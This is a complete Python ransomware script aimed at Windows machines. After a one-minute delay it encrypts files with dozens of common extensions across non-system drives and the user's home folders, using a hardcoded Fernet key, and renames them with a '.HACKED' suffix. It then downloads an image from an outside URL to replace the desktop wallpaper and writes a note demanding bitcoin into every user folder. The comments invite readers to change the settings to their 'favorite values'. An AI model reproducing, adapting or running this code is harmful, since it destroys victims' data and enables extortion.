import os.path  # for listing files
from cryptography.fernet import Fernet  # for encrypting files
import ctypes  # so we can interact with windows dlls and change windows background etc
from time import sleep
import threading
import requests



# The below variables you can change to your favorite values
RANSOM_MESSAGE = """All your files has been encrypted
To recover send two bitcions to the below address. 
"""
KEY = b'M_N5tyvEVlZv5cS4DBceIMTL0IgJl47nP_fxnoll--8=' # This is the key for encryption for fernet.
FILE_EXTENSION = ".HACKED" # You can change to your favorite word but must have dot(.) at the start
SLEEP_TIME = 60 # It will sleep for 1mins
BACKGROUND_WALLPAPER_URL = "https://www.pbmares.com/wp-content/uploads/2021/06/PBMares_Feature_Image_Ransomware.jpg" 

# if a file extension match in the list then it will be encrypt.
EXTENSIONS = ["doc", "txt", "jar", "dat", "xls", "xlsx", "ppt", "pptx", "odt", "jpg", "mka", "mhtml", "oqy",
              "png", "csv", "py", "sql", "mdb", "php", "asp", "aspx", "html", "htm", "xml", "psd", "pdf", "xla",
              "cub", "dae", "indd", "cs", "mp3", "mp4", "dwg", "zip", "rar", "mov", "rtf", "bmp", "mkv", "avi",
              "apk", "lnk", "dib", "dic", "dif", "divx", "iso", "7zip", "ace", "arj", "bz2", "cab", "gzip", "lzh",
              "tar", "jpeg", "xz", "mpeg", "torrent", "mpg", "core", "pdb", "ico", "pas", "db", "wmv", "swf", "cer",
              "bak", "backup", "accdb", "bay", "exif", "vss", "raw", "m4a", "wma", "flv", "sie", "sum", "ibank",
              "wallet", "css", "js", "rb", "crt", "xlsm", "xlsb", "7z", "cpp", "java", "jpe", "ini", "blob", "wps",
              "docm", "wav", "3gp", "webm", "m4v", "amv", "m4p", "svg", "ods", "bk", "vdi", "vmdk", "onepkg",
              "accde", "jsp", "json", "gif", "log", "gz", "vb", "m1v", "sln", "pst", "obj", "xlam", "inc", "cvs",
              "dbf", "tbi", "wpd", "dot", "dotx", "xltx", "pptm", "potx", "potm", "pot", "xlw", "xps", "xsd",
              "xsf", "xsl", "kmz", "stm", "accdt", "ppam", "pps", "ppsm", "1cd", "3ds", "3fr", "3g2", "accda",
              "accdc", "accdw", "adp", "ai", "ai3", "ai4", "ai5", "ai6", "ai7", "ai8", "arw", "ascx", "asm", "asmx",
              "avs", "bin", "cfm", "dbx", "dcm", "dcr", "pict", "rgbe", "dwt", "f4v", "exr", "kwm", "max", "mda",
              "mde", "mdf", "mdw", "mht", "mpv", "msg", "myi", "nef", "odc", "geo", "swift", "odm", "odp", "oft",
              "orf", "pfx", "p12", "pl", "pls", "safe", "tab", "vbs", "xlk", "xlm", "xlt", "svgz", "slk", "tar",
              "gz", "dmg", "ps", "psb", "tif", "rss", "key", "vob", "epsp", "dc3", "iff", "onetoc2", "p7b", "pam",
              "r3d", "inp", "docx"]

PARTITION_LIST = []  # for storing partition letters ex A,B,C ...

# encrypting the given file
def file_encryptor(file_name):
    fernet = Fernet(KEY)
    if os.path.exists(file_name):
        with open(file_name, 'rb') as file1:
            plaintext = file1.read()
        with open(file_name, "wb") as file2:
            file2.write(fernet.encrypt(plaintext))
        os.rename(file_name, file_name + FILE_EXTENSION)


def listing_files(partition_letter):
    for dire, sub_dir, files in os.walk(partition_letter):
        for file_name in files:
            abs_path = os.path.join(dire, file_name)
            check_ext = abs_path.split(".")[-1]
            # checking the extension of file and only encrypting files that is less than 1Gb.
            if check_ext in EXTENSIONS and os.path.getsize(abs_path) < 536870912:
                try:
                    file_encryptor(abs_path)
                except:
                    pass


#  listing available partition.
def list_partitions():
    for character in range(65, 91):
        path = chr(character) + ":\\"
        if os.path.exists(path):
            PARTITION_LIST.append(path)
    PARTITION_LIST.remove("C:\\") # removing the C partition to avoid OS crashing
    for partition in PARTITION_LIST:
        thread1 = threading.Thread(target=listing_files, args=(partition,))
        thread1.start()
        thread1.join()
    
    NAMES = ["Downloads", "Desktop", "Documents", "Music", "Pictures", "Videos"]
    for name in NAMES:
        try:
            listing_files(os.path.join(os.path.join(os.environ['USERPROFILE']), name))
        except:
            pass

# taking ransom message and dropping in the user folders
def message_dropper(message):
    for d, sd, f in os.walk(os.path.join(os.path.join(os.environ['USERPROFILE']))):
        try:
            with open(f"{d}\\WhatHappendToMySystem.txt", "wt") as file1:
                file1.write(message)
        except:
            pass


# it will download the image and use as desktop background.
def wallpaper_changer(image_url):
    image_dir = os.path.join(os.environ["AppData"])
    
    image_path = os.path.join(image_dir, "wallpaper.jpg")

    try:
        # Download the image
        response = requests.get(image_url, timeout=10)
        response.raise_for_status()  # Raise an error if request fails
        
        # Save the image locally
        with open(image_path, "wb") as file2:
            file2.write(response.content)
        print(f"Image saved at: {image_path}")
    except Exception as e:
        print(f"Failed to download image: {e}")
        return

    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
    except Exception:
        ctypes.windll.user32.SystemParametersInfoA(20, 0, image_path, 3)



# functions calls
sleep(SLEEP_TIME)
list_partitions()
wallpaper_changer(image_url=BACKGROUND_WALLPAPER_URL)
message_dropper(message=RANSOM_MESSAGE)
